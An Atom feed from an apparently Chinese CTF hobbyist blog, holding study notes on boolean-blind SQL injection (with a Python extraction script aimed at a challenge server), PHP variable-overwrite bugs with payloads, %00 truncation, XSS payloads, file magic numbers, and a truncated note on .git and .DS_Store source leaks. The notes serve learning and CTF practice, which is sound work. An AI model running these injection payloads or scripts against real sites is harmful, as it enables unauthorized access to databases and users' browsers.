<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Grim&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-07-06T10:30:53.660Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Mr1.Grim</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>基于布尔盲注的学习笔记</title>
    <link href="http://yoursite.com/2018/07/06/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84SQL/"/>
    <id>http://yoursite.com/2018/07/06/基于布尔盲注的SQL/</id>
    <published>2018-07-06T05:24:35.632Z</published>
    <updated>2018-07-06T10:30:53.660Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="https://blog.csdn.net/squeen_/article/details/52767887" target="_blank" rel="noopener">https://blog.csdn.net/squeen_/article/details/52767887</a></p><p>这里引用的是iscc的一道sql盲注题</p><a id="more"></a><h2 id="Iscc-web-Sqli"><a href="#Iscc-web-Sqli" class="headerlink" title="Iscc web Sqli"></a>Iscc web Sqli</h2><p>一道比较简单的布尔盲注题<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/L3V%25_%5BWHV%287%5BP%25~Q%7B%7BC3QL0.png" alt="image"></p><ul><li>首先找到注入点,测试是否为布尔盲注:<br></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;  // 返回账号密码错误&lt;br&gt;</span><br><span class="line">admin&apos; and 1 =1# //返回normal user: admin&apos; and 1 =1#</span><br></pre></td></tr></table></figure><p>密码随意</p><p>多次测试就两种结果，账号密码错误和normal user,可以推断这是一个布尔盲注题</p><h2 id="布尔盲注步骤"><a href="#布尔盲注步骤" class="headerlink" title="布尔盲注步骤"></a>布尔盲注步骤</h2><p>这里详细讲下盲注语句步骤:</p><h3 id="一、得到数据库的长度"><a href="#一、得到数据库的长度" class="headerlink" title="一、得到数据库的长度"></a>一、得到数据库的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and length(database())&gt;1# //长度为13</span><br></pre></td></tr></table></figure><h3 id="二、得到数据库的名称"><a href="#二、得到数据库的名称" class="headerlink" title="二、得到数据库的名称"></a>二、得到数据库的名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr(database(),1,1))&gt;1# // sqli_database</span><br></pre></td></tr></table></figure><p>这个和后面都要用脚本跑一下，脚本会在后面放出</p><h3 id="三、得到表名"><a href="#三、得到表名" class="headerlink" title="三、得到表名"></a>三、得到表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;1# //news,user</span><br></pre></td></tr></table></figure><h3 id="四、得到字段名"><a href="#四、得到字段名" class="headerlink" title="四、得到字段名"></a>四、得到字段名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;news&apos;),1,1))&gt;1#</span><br></pre></td></tr></table></figure><h3 id="五、得到字段的内容"><a href="#五、得到字段的内容" class="headerlink" title="五、得到字段的内容"></a>五、得到字段的内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(kjafuibafuohnuvwnruniguankacbh) from sqli_database.news),1,1))&gt;1#</span><br></pre></td></tr></table></figure><h3 id="python脚本获取"><a href="#python脚本获取" class="headerlink" title="python脚本获取"></a>python脚本获取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://118.190.152.202:8011/&apos;</span><br><span class="line"></span><br><span class="line">def test(num,asc):</span><br><span class="line"># data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr(database(),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125; //sqli_database</span><br><span class="line">    # data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;//news,user</span><br><span class="line">    # data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&apos;news\&apos;),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;//</span><br><span class="line">data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr((select group_concat(kjafuibafuohnuvwnruniguankacbh) from sqli_database.news ),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">if &apos;normal&apos; in r.text:</span><br><span class="line">return 1</span><br><span class="line">else:</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for num in range(0,100):</span><br><span class="line">for asc in range(0,255):</span><br><span class="line">get = test(num,asc)</span><br><span class="line">if get == 0:</span><br><span class="line">flag += chr(asc)</span><br><span class="line">print(flag)</span><br><span class="line">break</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;https://blog.csdn.net/squeen_/article/details/52767887&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/squeen_/article/details/52767887&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里引用的是iscc的一道sql盲注题&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>代码审计|变量覆盖漏洞</title>
    <link href="http://yoursite.com/2018/07/06/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/07/06/变量覆盖漏洞/</id>
    <published>2018-07-06T05:24:35.632Z</published>
    <updated>2018-07-06T10:40:26.804Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="http://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">http://www.freebuf.com/column/150731.html</a></p><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞</span><br></pre></td></tr></table></figure><a id="more"></a><p>经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variables()使用不当，开启了全局变量注册等。 </p><p>下面讲解一下CTF的几个例题</p><h2 id="0x02-导致变量覆盖漏洞"><a href="#0x02-导致变量覆盖漏洞" class="headerlink" title="0x02 $$ 导致变量覆盖漏洞"></a>0x02 $$ 导致变量覆盖漏洞</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$name=’thinking’;</span><br><span class="line">foreach ($_GET as $key =&gt; $value)</span><br><span class="line">$$key = $value;</span><br><span class="line">var_dump($key);</span><br><span class="line">print(&apos;&lt;br&gt;&apos;);</span><br><span class="line">var_dump($value);</span><br><span class="line">print(&apos;&lt;br&gt;&apos;);</span><br><span class="line">var_dump($$key);</span><br><span class="line">print(&apos;&lt;br&gt;&apos;);</span><br><span class="line">echo $name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现,用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。</p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/T%5DL%7DE51HC%29EDE91OK~%255%29JL.png" alt="image"></p><h2 id="0x03-例题"><a href="#0x03-例题" class="headerlink" title="0x03 $$ 例题"></a>0x03 $$ 例题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$_403 = ‘Hello’;</span><br><span class="line">$_200 = ‘HEEEE’;</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != “POST”)</span><br><span class="line">    die(‘BABABA’);</span><br><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br><span class="line">foreach ($_GET as $key =&gt; $value) </span><br><span class="line">    $$key = $$value;</span><br><span class="line">foreach ($_POST as $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo “This is your flag : “. $flag . “\n”;</span><br><span class="line">die($_200);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造的payload如图:<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/08%60RPTG%7B~ZIBE%7DKS9TKLH9Q.png" alt="image"></p><p>根据这个payload传入两个foreach两个流程就是:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_200=$flag //把原来的值给覆盖了</span><br><span class="line">$flag=aaaaaaaaaaa //符合只后的等于post</span><br></pre></td></tr></table></figure></p><h2 id="0x04-extract-函数"><a href="#0x04-extract-函数" class="headerlink" title="0x04 extract()函数"></a>0x04 extract()函数</h2><p>extract() 函数从数组中将变量导入到当前的符号表。<br><br><a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = ‘xxx’;</span><br><span class="line">extract($_GET);</span><br><span class="line">if (isset($gift)) &#123;</span><br><span class="line">    $content = trim(file_get_contents($flag));</span><br><span class="line">    if ($gift == $content) &#123;</span><br><span class="line">        echo ‘hctf&#123;…&#125;’;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo ‘Oh..’;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="代码审计分析"><a href="#代码审计分析" class="headerlink" title="代码审计分析"></a>代码审计分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目使用了extract($_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</span><br></pre></td></tr></table></figure><p>构造get的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=&amp;gift=</span><br></pre></td></tr></table></figure><h2 id="0x05-parse-str-函数"><a href="#0x05-parse-str-函数" class="headerlink" title="0x05 parse_str()函数"></a>0x05 parse_str()函数</h2><p>parse_str() 函数把查询字符串解析到变量中。<br><br><a href="http://www.w3school.com.cn/php/func_string_parse_str.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_parse_str.asp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (empty($_GET[&apos;id&apos;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    include (‘flag.php’);</span><br><span class="line">    $a = “www.OPENCTF.com”;</span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    @parse_str($id);</span><br><span class="line">    if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        exit(‘其实很简单其实并不难！’);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ul><li>通过parse_str函数可将$a变量覆盖</li><li>md5函数 0e开头绕过</li></ul><p>构造的payload为:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a[0]=s878926199a</span><br></pre></td></tr></table></figure></p><h2 id="0x06-import-request-variables-函数"><a href="#0x06-import-request-variables-函数" class="headerlink" title="0x06 import_request_variables()函数"></a>0x06 import_request_variables()函数</h2><p>将GET/POST/Cookie变量导入到全局作用域中</p><p>bool import_request_variables(string $types[, string $prefix])</p><p>types:指定需要导入的变量，可以用’G’,’P’和’C’表示GET,POST和Cookie.<br>prefix作为变量名的前缀，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$auth=&apos;0&apos;;</span><br><span class="line">import_request_variable();</span><br><span class="line"></span><br><span class="line">if($auth == 1)&#123;</span><br><span class="line">    echo &quot;private!&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    echo &quot;public&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造payload:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?auth=1</span><br></pre></td></tr></table></figure></p><p>会输出private,说明已经成功覆盖原来的0了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没啥好总结的，多看代码多学习多分析.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;http://www.freebuf.com/column/150731.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.freebuf.com/column/150731.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-原理&quot;&gt;&lt;a href=&quot;#0x01-原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理&quot;&gt;&lt;/a&gt;0x01 原理&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF常见文件头标志</title>
    <link href="http://yoursite.com/2018/07/06/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
    <id>http://yoursite.com/2018/07/06/常见文件头/</id>
    <published>2018-07-06T05:24:35.632Z</published>
    <updated>2018-07-06T10:36:24.477Z</updated>
    
    <content type="html"><![CDATA[<p>在winhex下会经常看到许多十六进制码,这里深刻了解下.<br><a id="more"></a></p><ul><li>jpg/jpeg  文件头:FF D8 FF</li><li>png       文件头:89 50 4E 47 0D</li><li>gif       文件头:47 49 46 38 39</li><li>zip       文件头:50 4B 03 04 14</li><li>rar       文件头:52 61 72 21 1A</li><li>bmp       文件头:42 4D 36 5D 3D</li><li>mp3       文件头:49 44 33 03 00</li><li>wav       文件头:52 49 46 46 18</li></ul><p><a href="https://www.cnblogs.com/WangAoBo/p/6366211.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/6366211.html</a><br><br><br><a href="https://www.cnblogs.com/sch01ar/p/8232084.html" target="_blank" rel="noopener">https://www.cnblogs.com/sch01ar/p/8232084.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在winhex下会经常看到许多十六进制码,这里深刻了解下.&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP %00截断原理</title>
    <link href="http://yoursite.com/2018/07/06/%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2018/07/06/截断问题/</id>
    <published>2018-07-06T05:24:35.632Z</published>
    <updated>2018-07-06T10:36:47.788Z</updated>
    
    <content type="html"><![CDATA[<p>这里有篇不错的文章<br><br><a id="more"></a><br><a href="https://blog.csdn.net/zhangzhuangtongxue/article/details/78198191" target="_blank" rel="noopener">从源码级别了解PHP %00截断原理</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>PHP的00截断是5.2.x版本的一个漏洞，当用户输入的url参数包含%00经过浏览器自动转码后截断后面字符。</p><h2 id="漏洞代码示例"><a href="#漏洞代码示例" class="headerlink" title="漏洞代码示例"></a>漏洞代码示例</h2><p>例如url输入的文件名1.txt%00.jpg经过url转码后会变为1.txt\000.jpg，测试文件1.php如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    include &quot;1.txt\000.jpg&quot;;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>测试文件1.txt如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    echo &apos;fireXXX&apos;;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>php5.2.x版本解析1.php时，会将1.txt\000.jpg解释为1.txt </p><h2 id="长度问题"><a href="#长度问题" class="headerlink" title="长度问题"></a>长度问题</h2><p>旦出现%00截断，include的文件名经过url转码由”1.txt%00.jpg”变为”1.txt\000.jpg”，进入php语法词法分析器解析后会将这个字符串解析成一个字符串，并使用zend_scan_escape_string进行字符串转码<br><br>中间的\\000还被解析为4个字符，转码中会将他当作八进制数据转成一个字符\0，因此最终1.txt\000.jpg长度是10。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里有篇不错的文章&lt;br&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS注入原理及应用</title>
    <link href="http://yoursite.com/2018/07/06/XSS/"/>
    <id>http://yoursite.com/2018/07/06/XSS/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:44:08.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><h3 id="参考书籍-《白帽子讲web安全》"><a href="#参考书籍-《白帽子讲web安全》" class="headerlink" title="参考书籍:《白帽子讲web安全》"></a>参考书籍:《白帽子讲web安全》</h3><p>XSS 跨站脚本攻击(Cross Site Script)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过(插入恶意脚本，实现对用户游览器的控制。<br><a id="more"></a></p><h3 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h3><p>首先在本地搭个PHP环境,代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&quot;param&quot;];</span><br><span class="line">echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ch01/xss.php?param=hello</span><br></pre></td></tr></table></figure><p>可以看到页面输出hello,那么尝试提交一段HTML代码会怎么样呢<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ch01/xss.php?param=&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/J3R6J6VRAM2PND6%29W%7BYF%60PB.png" alt="image"></p><p>成功弹出框，说明存在XSS注入,这就是简单的XSS基本原理了.<br><br>这里有个不错的链接讲解<br><br><a href="http://netsecurity.51cto.com/art/201408/448305_all.htm" target="_blank" rel="noopener">XSS的原理分析与解剖</a></p><p>xss分为三类:<br></p><ul><li><p>反射型XSS：又称“非持久性XSS”（Non-persistent XSS），只是简单地把用户输入的数据“反射”给浏览器。</p></li><li><p>存储型XSS：又称“持久型XSS”，用户输入的数据存储在服务器端，具有很强的稳定性</p></li><li><p>DOM Based XSS：这种类型并非按照“数据是否保存在服务器端”来划分，从效果上来说也是反射型XSS，但其形成原因较特别。出于历史原因，就把他单独作为一个分类了。修改页面的DOM结点形成XSS，故称之为DOM Based XSS。</p></li></ul><p>再看如下代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function test()&#123;</span><br><span class="line">var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos; &gt;testLink&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id =&quot;t&quot; &gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot;/&gt;</span><br></pre></td></tr></table></figure></p><p>点击”write”按钮后，会在当前页面插入一个超链接，其地址为文本框的内容。<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/X42ZFS%60KH@XIQCL%5DJI%608ORK.png" alt="image"></p><p>这里的 “write”按钮中的onclick事件调用了test()函数.而在test()函数中,修改了页面的DOM节点,通过innerHTML把一段用户数据当作HTML写入到页面中，这就造成了DOM based XSS.</p><p>接下来尝试构造如下数据:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=alert(&apos;xss&apos;) //</span><br></pre></td></tr></table></figure></p><p>输入后页面代码变成了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf=&apos;&apos; onclick=alert(&apos;xss&apos;)//&apos;&gt;testLink&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><ul><li>第一个单引号闭合掉href的第一个单引号</li><li>//是注释符,注释掉第二个单引号</li></ul><p>点击这个新生成的链接，脚本将被执行:<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/%299IH$CB9%25%25%7DK2%5D3SGE%295C%5DR.png" alt="image"></p><p>这个就是恶意脚本的执行。<br><br>还有另一种利用方式——除了构造一个新事件外,还可以选择闭合掉标签,并插入一个新的HTML标签:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;img src=# onerror=alert(&apos;xss&apos;) /&gt;&lt;&apos;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;XSS简介&quot;&gt;&lt;a href=&quot;#XSS简介&quot; class=&quot;headerlink&quot; title=&quot;XSS简介&quot;&gt;&lt;/a&gt;XSS简介&lt;/h2&gt;&lt;h3 id=&quot;参考书籍-《白帽子讲web安全》&quot;&gt;&lt;a href=&quot;#参考书籍-《白帽子讲web安全》&quot; class=&quot;headerlink&quot; title=&quot;参考书籍:《白帽子讲web安全》&quot;&gt;&lt;/a&gt;参考书籍:《白帽子讲web安全》&lt;/h3&gt;&lt;p&gt;XSS 跨站脚本攻击(Cross Site Script)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过(插入恶意脚本，实现对用户游览器的控制。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>文件源码泄漏大全</title>
    <link href="http://yoursite.com/2018/07/06/yuanma/"/>
    <id>http://yoursite.com/2018/07/06/yuanma/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:44:24.257Z</updated>
    
    <content type="html"><![CDATA[<h4 id="2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。"><a href="#2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。" class="headerlink" title="2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。"></a>2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。</h4><h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br><a id="more"></a><br> <a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">原理链接+工具链接</a></p><h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。<br>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">原理链接+工具链接</a></p><h3 id="swp源码泄漏"><a href="#swp源码泄漏" class="headerlink" title=".swp源码泄漏"></a>.swp源码泄漏</h3><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="vim临时文件"><a href="#vim临时文件" class="headerlink" 